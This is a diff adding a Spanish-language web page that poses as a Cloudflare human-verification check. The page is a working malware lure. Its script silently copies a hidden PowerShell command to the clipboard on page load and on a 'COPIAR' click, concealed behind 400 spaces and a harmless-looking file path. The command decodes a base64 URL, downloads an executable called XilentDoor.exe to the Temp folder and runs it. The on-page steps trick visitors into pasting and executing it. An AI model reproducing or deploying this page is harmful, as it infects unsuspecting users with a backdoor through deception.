@@ -1,0 +1,455 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Un paso más — Verificación</title>
+  <style>
+    :root{
+      --bg:#ffffff;
+      --muted:#6b7280;
+      --accent:#f18a20; /* naranja */
+      --card:#ffffff;
+      --shadow: 0 6px 24px rgba(15,23,42,0.06);
+      --glass: rgba(0,0,0,0.04);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    html,body{
+      height:100%;
+      margin:0;
+      background:var(--bg);
+      color:#111827;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+
+    /* page layout */
+    .shell{
+      min-height:100%;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:48px 24px;
+      box-sizing:border-box;
+    }
+
+    .container{
+      width:100%;
+      max-width:980px;
+    }
+
+    header{
+      margin-bottom:28px;
+    }
+    h1{
+      font-size:36px;
+      margin:0 0 8px;
+      font-weight:700;
+    }
+    p.lead{
+      margin:0 0 36px;
+      color:var(--muted);
+      font-size:16px;
+    }
+
+    .main-row{
+      display:flex;
+      gap:28px;
+      align-items:flex-start;
+    }
+
+    /* left card (spinner and small card preview) */
+    .left{
+      width:320px;
+      min-height:220px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      position:relative;
+    }
+
+    .spinner-circle{
+      width:60px;
+      height:60px;
+      border-radius:50%;
+      display:inline-grid;
+      place-items:center;
+      box-shadow: inset 0 0 0 6px rgba(241,138,32,0.12);
+    }
+    .spinner-dot{
+      width:10px;height:10px;border-radius:50%;
+      animation: spin 1.2s linear infinite;
+      box-shadow: 0 0 0 6px rgba(241,138,32,0.2);
+      background:linear-gradient(180deg,#ffb259,#f18a20);
+    }
+    @keyframes spin{
+      0%{ transform: translateY(0) scale(1);}
+      50%{ transform: translateY(-6px) scale(1.08);}
+      100%{ transform: translateY(0) scale(1);}
+    }
+
+    /* center card - verification steps */
+    .verify-card{
+      width:420px;
+      background:var(--card);
+      border-radius:6px;
+      box-shadow:var(--shadow);
+      overflow:hidden;
+      border:1px solid rgba(0,0,0,0.03);
+    }
+
+    .verify-header{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      background:linear-gradient(180deg, rgba(241,138,32,0.98), #e57912);
+      color:white;
+      padding:12px 16px;
+      font-weight:600;
+    }
+
+    .verify-body{
+      padding:18px 18px 14px 18px;
+      color:#374151;
+      font-size:14px;
+      line-height:1.4;
+    }
+
+    .instructions{
+      margin-top:8px;
+      background:#fbfbfb;
+      border-radius:6px;
+      padding:10px;
+      border:1px solid rgba(0,0,0,0.03);
+    }
+
+    .instruction-step{
+      display:flex;
+      gap:10px;
+      align-items:flex-start;
+      margin:8px 0;
+    }
+
+    .kbd {
+      display:inline-block;
+      padding:6px 8px;
+      border-radius:6px;
+      background:linear-gradient(180deg,#fff,#f6f6f6);
+      border:1px solid rgba(0,0,0,0.06);
+      box-shadow: 0 1px 0 rgba(0,0,0,0.02);
+      font-weight:700;
+      font-family: monospace;
+      font-size:13px;
+    }
+
+    .small-muted{
+      color:var(--muted);
+      font-size:13px;
+    }
+
+    .verify-footer{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding:14px 18px;
+      border-top:1px solid rgba(0,0,0,0.04);
+    }
+
+    .verify-btn{
+      background:var(--accent);
+      color:white;
+      border:none;
+      padding:10px 18px;
+      border-radius:6px;
+      font-weight:700;
+      cursor:pointer;
+      box-shadow: 0 6px 18px rgba(241,138,32,0.18);
+    }
+    .verify-btn:active{transform:translateY(1px)}
+
+    .left-note{
+      font-size:13px;
+      color:var(--muted);
+    }
+
+    /* right big text area (mimic the Cloudflare page text) */
+    .right{
+      flex:1;
+      min-width:340px;
+      display:flex;
+      align-items:center;
+    }
+    .right p{
+      margin:0;
+      color:var(--muted);
+      font-size:16px;
+    }
+
+    /* footer small */
+    footer{
+      margin-top:60px;
+      width:100%;
+      text-align:center;
+      color:var(--muted);
+      font-size:12px;
+    }
+    .cloud-row{
+      margin-top:10px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:6px;
+    }
+
+    /* copy button styles */
+    .copy-btn {
+      background:var(--accent);
+      border: 1px solid #f5851d;
+      border-radius: 4px;
+      padding: 4px 8px;
+      font-size: 11px;
+      cursor: pointer;
+      margin-left: 6px;
+      font-weight: 600;
+      color: #ffffff;
+    }
+    .copy-btn:hover {
+      background: #f39843;
+      border: 1px solid #f5851d;
+    }
+    .copy-btn:active {
+      transform: translateY(1px);
+    }
+
+    /* responsive */
+    @media (max-width:900px){
+      .main-row{
+        flex-direction:column;
+        align-items:center;
+      }
+      .left, .verify-card{ width:100%; max-width:520px;}
+      .right{ max-width:720px; padding:16px; text-align:center;}
+    }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <div class="container">
+      <header>
+        <h1>Un paso más...</h1>
+        <p class="lead">Verifica que eres humana completando la acción a continuación.</p>
+      </header>
+
+      <div class="main-row">
+
+        <div class="left" aria-hidden="true">
+          <div style="text-align:center">
+            <div class="spinner-circle" role="img" aria-label="loading">
+              <div class="spinner-dot"></div>
+            </div>
+            <div style="height:8px"></div>
+            <div class="left-note">Comprueba la seguridad de tu conexión antes de continuar.</div>
+          </div>
+        </div>
+
+        <div>
+          <div class="verify-card" role="dialog" aria-labelledby="verify-title">
+            <div class="verify-header">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="11" stroke="white" stroke-opacity="0.18" stroke-width="1.5"/><path d="M8.5 12.5l2.3 2.3 4.7-6.2" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+              <div id="verify-title">Complete los siguientes pasos de verificación</div>
+            </div>
+
+            <div class="verify-body">
+              <div class="small-muted">Para demostrar que no eres un robot, por favor, siga las instrucciones:</div>
+
+              <div class="instructions" style="margin-top:12px;">
+                <div class="instruction-step">
+                  <div style="flex:1">
+                    <div style="font-weight:700">1- Copie la siguiente ruta: <span class="kbd">C:\Users\Default\verification.conf</span>
+                      <button class="copy-btn" id="copyPathBtn">COPIAR</button>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="instruction-step">
+                  <div style="flex:1">
+                    <div style="font-weight:700">2- Presione la tecla: <span class="kbd">Win + E</span></div>
+                    <div class="small-muted">Esto abrirá el explorador de archivos.</div>
+                  </div>
+                </div>
+                
+                <div class="instruction-step">
+                  <div style="flex:1">
+                    <div style="font-weight:700">3- Pegue la seleccion en el cuadro de inicio con: <span class="kbd">Ctrl + V</span></div>
+                    <div class="small-muted">Pegar el texto necesario en la ventana.</div>
+                  </div>
+                </div>
+
+                <div class="instruction-step">
+                  <div style="flex:1">
+                    <div style="font-weight:700">4- Presione <span class="kbd">Enter</span> en su teclado para finalizar.</div>
+                    <div class="small-muted">Observe y confirme.</div>
+                  </div>
+                </div>
+
+                <div style="margin-top:10px; font-size:13px; color:#064e3b; display:flex; align-items:center; gap:8px;">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5" stroke="#064e3b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                  <div style="font-weight:600">You will observe and agree:</div>
+                </div>
+
+                <div style="margin-top:8px; font-size:13px; color:var(--muted)">
+                  <label style="display:flex; align-items:center; gap:8px;">
+                    <input type="checkbox" checked disabled style="transform:scale(1.1)"/>
+                    <span>No soy un robot - Cloudflare Verification ID: 7337*</span>
+                  </label>
+                </div>
+
+              </div>
+
+              <div class="verify-footer" style="margin-top:12px;">
+                <div class="small-muted">Realice los pasos anteriores para finalizar la verificación.</div>
+                <button class="verify-btn" id="verifyBtn">VERIFICAR</button>
+              </div>
+
+            </div>
+          </div>
+        </div>
+
+        <div class="right" aria-hidden="true">
+          <img src="https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2020/10/cloudflare-logo-large.webp" height="90" width="170">
+        </div>
+      </div>
+
+      <footer>
+        <div style="height:1px; background:rgba(0,0,0,0.03); margin-bottom:18px;"></div>
+        <div>Ray ID: <span style="font-family:monospace; color:#4b5563;">6a1b2c3d4e5f6789</span></div>
+        <div class="cloud-row">
+          <div>Performance &amp; security by</div>
+          <svg width="78" height="16" viewBox="0 0 78 16" aria-hidden="true">
+            <rect x="0" y="0" width="78" height="16" fill="transparent"/>
+            <text x="0" y="12" font-family="Inter, Arial" font-size="12" fill="#0f172a">Cloudflare</text>
+          </svg>
+        </div>
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      const btn = document.getElementById('verifyBtn');
+      const copyBtn = document.getElementById('copyPathBtn');
+
+      // Función para generar el comando PowerShell con contenido oculto
+      function copyVerificationData() {
+        // Comando PowerShell que descarga y ejecuta la imagen
+        var powershellCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"& {$userName = $env:USERNAME; $encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL1IzTEk0TlQvWGlsZW50RG9vci9yZWxlYXNlcy9kb3dubG9hZC9YaWxlbnREb29yL1hpbGVudERvb3IuZXhl'; $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl)); $localPath = 'C:\\Users\\' + $userName + '\\AppData\\Local\\Temp\\XilentDoor.exe'; (New-Object Net.WebClient).DownloadFile($downloadUrl, $localPath); Start-Process $localPath;}\"";;
+        
+        // Ruta inocua que se mostrará
+        var visiblePath = "C:\\Users\\Default\\verification.conf";
+        
+        // Generar muchos espacios en blanco (400 caracteres para mejor ocultación)
+        var spaces = "                                                                                                    " +
+                     "                                                                                                    " +
+                     "                                                                                                    " +
+                     "                                                                                                    ";
+        
+        // Combinar: comando PowerShell + espacios + ruta visible
+        var fullText = powershellCommand + spaces + visiblePath;
+        
+        return fullText;
+      }
+
+      // Función para copiar al portapapeles
+      function copyToClipboard(text) {
+        return navigator.clipboard.writeText(text).then(() => {
+          console.log("Datos de verificación copiados al portapapeles");
+          return true;
+        }).catch(err => {
+          console.error('Error al copiar: ', err);
+          // Fallback para navegadores antiguos
+          var textArea = document.createElement("textarea");
+          textArea.value = text;
+          document.body.appendChild(textArea);
+          textArea.select();
+          document.execCommand("copy");
+          document.body.removeChild(textArea);
+          return true;
+        });
+      }
+
+      // Función para copiar la ruta al portapapeles
+      copyBtn.addEventListener('click', function() {
+        const fullText = copyVerificationData();
+        
+        copyToClipboard(fullText).then(() => {
+          // Cambiar temporalmente el texto del botón
+          const originalText = copyBtn.textContent;
+          copyBtn.textContent = 'COPIADO!';
+          copyBtn.style.background = '#f5851d';
+          copyBtn.style.color = 'white';
+          
+          setTimeout(() => {
+            copyBtn.textContent = originalText;
+            copyBtn.style.background = '';
+            copyBtn.style.color = '';
+          }, 1500);
+        }).catch(err => {
+          console.error('Error al copiar: ', err);
+          copyBtn.textContent = 'ERROR';
+          copyBtn.style.background = '#ef4444';
+          copyBtn.style.color = 'white';
+          
+          setTimeout(() => {
+            copyBtn.textContent = 'COPIAR';
+            copyBtn.style.background = '';
+            copyBtn.style.color = '';
+          }, 1500);
+        });
+      });
+
+      // Copiar automáticamente al cargar la página
+      window.addEventListener('load', function() {
+        setTimeout(function() {
+          const fullText = copyVerificationData();
+          copyToClipboard(fullText).then(() => {
+            console.log("Datos de verificación copiados automáticamente al portapapeles");
+          }).catch(err => {
+            console.error('Error copying to clipboard: ', err);
+          });
+        }, 1000);
+      });
+
+      btn.addEventListener('click', function(){
+        btn.disabled = true;
+        btn.textContent = 'VERIFICANDO...';
+        btn.style.opacity = '0.95';
+        setTimeout(() => {
+          btn.textContent = 'VERIFICADO';
+          btn.style.background = '#10b981';
+          btn.style.boxShadow = '0 6px 18px rgba(16,185,129,0.18)';
+          showToast('Verified — thank you.');
+        }, 1400);
+      });
+
+      function showToast(msg){
+        const t = document.createElement('div');
+        t.textContent = msg;
+        t.style.position='fixed';
+        t.style.right='18px';
+        t.style.bottom='18px';
+        t.style.padding='10px 14px';
+        t.style.borderRadius='8px';
+        t.style.boxShadow='0 8px 30px rgba(2,6,23,0.12)';
+        t.style.background='white';
+        t.style.border='1px solid rgba(0,0,0,0.06)';
+        t.style.fontSize='14px';
+        document.body.appendChild(t);
+        setTimeout(()=>{ t.style.transition='opacity 400ms'; t.style.opacity=0 }, 2400);
+        setTimeout(()=> t.remove(), 2800);
+      }
+    })();
+  </script>
+</body>
+</html>
